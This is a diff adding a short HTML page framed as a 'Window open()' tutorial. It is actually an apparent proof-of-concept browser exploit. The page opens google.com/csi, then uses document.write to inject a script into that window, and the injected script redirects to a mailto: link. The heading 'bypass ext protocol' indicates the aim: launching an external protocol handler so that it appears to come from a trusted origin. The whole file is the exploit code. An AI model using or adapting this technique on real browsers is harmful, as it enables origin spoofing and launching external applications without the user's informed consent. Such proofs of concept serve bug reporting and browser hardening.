@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>The Window Object</h1>
+<h2>The open() Method</h2>
+
+<p>Click the button to open a new browser window.</p>
+
+<button onclick="myFunction()">Try it</button>
+
+<script>
+function myFunction() {
+ var x = open("https://www.google.com/csi","_blank", "resizable=yes");
+
+ setTimeout(function(){x}, 1850)
+
+ setTimeout(function(){
+    x.document.write(`
+    <h1>bypass ext protocol</title>
+
+    <script>
+        window.location.href = "mailto:hajinaim@gmail.com";
+    <\/script>
+    `);
+ }, 2400)
+}
+</script>
+
+</body>
+</html>
